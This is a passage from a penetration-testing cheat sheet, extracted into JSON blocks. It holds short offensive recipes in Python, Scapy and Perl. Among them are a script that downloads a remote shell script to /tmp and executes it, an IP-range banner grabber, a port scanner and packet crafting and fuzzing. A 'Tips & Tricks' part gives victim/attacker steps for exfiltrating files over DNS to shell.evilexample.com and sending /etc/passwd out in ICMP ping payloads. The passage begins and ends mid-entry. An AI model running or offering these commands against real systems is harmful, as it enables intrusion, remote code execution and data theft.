      }
    },
    {
      "type": "code_block",
      "content": "u = \"http://%s:%s/%s\" % (url, port, payload)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "try:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "r = urlopen(u)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "wfile = open(\"/tmp/cb.sh\",\"wb\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "wfile.write(r.read())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "wfile.close()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "break",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "except: continue",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "if os.path.exists(\"/tmp/cb.sh\"):",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "os.system(\"chmod 700 /tmp/cb.sh\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "os.system(\"/tmp/cb.sh\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Python Email Sender (SendMail Must Be Installed)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import smtplib",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from email import encoders",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from email.mime.text import MIMEText",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from email.mime.base import MIMEBase",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "server = smtplib.SMTP('<SMTP_SERVER>', <PORT>)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "server.ehlo()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "with open('<FILE_PATH>', 'r') as f:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "password = f.read()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "server.login('<EMAIL>', password)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "msg = MIMEMultipart()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msg['From'] = '<FROM_EMAIL>'",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msg['To'] = '<TO_EMAIL>'",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "msg['Subject'] = '<SUBJECT_LINE>'",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "with open('<FILE_PATH>', 'r') as f:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "message = f.read()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "msg.attach(MIMEText(message, 'plain'))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "text = msg.as_string()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "server.sendmail('<FROM_EMAIL>', '<TO_EMAIL>', text)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate Random String of N Length",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import string, random",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "n=10",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "randstr = \"\".join(random.choice(string.ascii_letters + string.digits) for n in range(n))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print (randstr)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python HTTP Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "python –m SimpleHTTPServer <PORT>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Custom Python HTTP Banner Grabber",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#!/usr/bin/python",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "#Sample syntax: python test.py -t 127.0.0.1-2 -p 8000 -d 1",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "import sys, time",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from urllib.request import urlopen",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from optparse import OptionParser",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "parser = OptionParser()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "parser.add_option(\"-t\", dest=\"iprange\",help=\"target IP range, i.e. 192.168.1.1-25\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "parser.add_option(\"-p\", dest=\"port\",default=\"80\",help=\"port, default=80\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "parser.add_option(\"-d\", dest=\"delay\",default=\".5\",help=\"delay (in seconds), default=.5 seconds\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(opts, args) = parser.parse_args()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "if opts.iprange is None:",
      "level": 0,
      "metadata": {
        "file_paths": [
          "opts.iprang"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "parser.error(\"you must supply an IP range\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ips = []",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "headers = {}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "octets = opts.iprange.split('.')",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "start = octets[3].split('-')[0]",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "stop = octets[3].split('-')[1]",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for i in range(int(start),int(stop)+1):",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ips.append('%s.%s.%s.%d' % (octets[0],octets[1],octets[2],i))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print(\"\\nScanning IPs: %s\\n\" % (ips))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "for ip in ips:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "try:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "response = urlopen(\"http://{}:{}\".format(ip, opts.port))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "headers[ip] = dict(response.info())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "except Exception as e:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "headers[ip] = \"Error: \" + str(e)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "time.sleep(float(opts.delay))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "for header in headers:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "try:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print(\"%s : %s\" % (header,headers[header].get('server')))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "except:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print(\"%s : %s\" % (header,headers[header]))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scapy",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scapy Setup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "iptables –A OUTPUT –p tcp –-tcp-flags RST RST –j DROP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "When TCP packets are crafted with Scapy, the underlying OS will not recognize the initial SYN packet and will reply with a RST packet. To mitigate this, set the following iptables rule",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Expression",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Description",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from scapy.all import *",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Imports all scapy libraries",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ls()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all available protocols",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "lsc()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "List all scapy functions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "conf",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Show/set scapy config",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "IP(src=RandIP())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate random src IPs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Ether(src=RandMAC())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate random src MACs",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ip=IP(src=\"<IP_ADDRESS>\",dst=\"<IP_ADDRESS>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Specify IP parameters",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "tcp=TCP(dport=<PORT>)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Specify TCP parameters",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "data=\"TCP data\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Specify data portion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "packet=ip/tcp/data",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Create IP()/TCP() packet",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "packet.show()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Display packet configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "send(packet,count=1)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send 1 packet @ layer 3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "sendp(packet,count=2)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send 2 packets @ layer 2",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "sendpfast(packet)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send faster using tcpreply",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "sr(packet)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send 1 packet & get replies",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "sr1(packet)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send only return 1st reply",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for i in range(0,1000):",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "send (<PACKET_VARIABLE>)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send <packet> 1000 times",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "sniff(count=100,iface=”<INTERFACE_NAME>”)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Sniff 100 packets on given interface",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send IPv6 ICMP Message",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "sr(IPv6(src=\"<IP_ADDRESS>\", dst=\"<IP_ADDRESS>\")/ICMP())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "UDP Packet With Specific Payload",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from scapy.all import *",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ip=IP(src=\"<IP_ADDRESS>\", dst=\"<IP_ADDRESS>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "u=UDP(dport=<PORT>, sport=<PORT>)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "pay = \"my UDP packet\"",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "packet=ip/u/pay",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "packet.show()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "wrpcap (\"<OUTPUT_PATH>\",packet) : write to pcap",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "send(packet)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NTP Fuzzer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from scapy.all import *",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "packet=IP(src=\"<IP_ADDRESS>\", dst=\"<IP_ADDRESS>\")/UDP(dport=<PORT>)/fuzz(NTP(version=4,mode=4))",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "send(packet)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send HTTP Message",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "from scapy.all import *",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "fileweb = open(\"web.txt\",'r')",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "data = fileweb.read()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ip = IP(dst=\"<IP>\")",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SYN = ip/TCP(sport=RandNum(6000,7000),dport=80,flags=\"S\",seq=4)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SYNACK = sr1(SYN)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ACK = ip/TCP(sport=SYNACK.dport, dport=80, flags=\"A\", seq=SYNACK.ack, ack=SYNACK.seq+1)/data",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "reply, error = sr(ACK)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print(reply.show())",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl Port Scanner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "use strict;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "use IO::Socket;",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for(my $port=<START_PORT>;$port<<END_PORT>;$port++)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "{",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "my $remote=IO::Socket::INET->new( Proto=>\"tcp\",PeerAddr=>\"<TARGET_IP>\",PeerPort=>$port);",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "if($remote)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "{",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "print \"$port is open\\n\";",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "};",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "}",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tips & Tricks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tips & Tricks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FTP Through Non-Interactive Windows Shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo open <IP_ADDRESS> 21 > ftp.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ftp.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo <USERNAME> >> ftp.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ftp.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo <PASSWORD> >> ftp.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ftp.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo bin >> ftp.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ftp.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo GET <FILE_PATH> >> ftp.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ftp.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "echo bye >> ftp.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ftp.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ftp –v -n -s:ftp.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "ftp.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS Transfer on Linux",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xxd -p secret > file.hex",
      "level": 0,
      "metadata": {
        "file_paths": [
          "file.hex"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "On Victim:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hex encode the file to be transferred:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "for b in `cat file.hex `; do dig $b.shell.evilexample.com; done",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "On Victim:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Read in each line and do a DNS lookup:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump -w /tmp/dns -s0 port 53 and host system.example.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "system.example.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "On attacker:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Capture DNS exfil packets:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d' ' | cut -f1 -d'.' | uniq > received.txt",
      "level": 0,
      "metadata": {
        "file_paths": [
          "shell.evilexample.com",
          "received.txt"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "On attacker:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Cut the exfilled hex from the DNS packet:",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xxd -r -p < received.txt > keys.pgp",
      "level": 0,
      "metadata": {
        "file_paths": [
          "received.txt",
          "keys.pgp"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse the hex encoding:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Exfil Command Output on a Linux Machine Over ICMP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "stringZ=`cat /etc/passwd | od -tx1 | cut -c8- | tr -d \" \" | tr -d \"\\n\"`; counter=0; while (($counter <= ${#stringZ}));do ping -s 16 -c 1 -p ${stringZ:$counter:16} 192.168.10.10 &&",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "counter=$((counter+16));done",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "On victim",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "tcpdump -ntvvSxs 0 'icmp[0]=8' > data.dmp",
      "level": 0,
      "metadata": {
        "file_paths": [
          "data.dmp"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "grep 0x0020 data.dmp | cut -c21- | tr -d \" \" | tr -d \"\\n\" | xxd -r -p",
      "level": 0,
      "metadata": {
        "file_paths": [
          "data.dmp"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "On attacker (capture packets to data.dmp and parse):",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Sending Email From Open Relay (Telnet)",
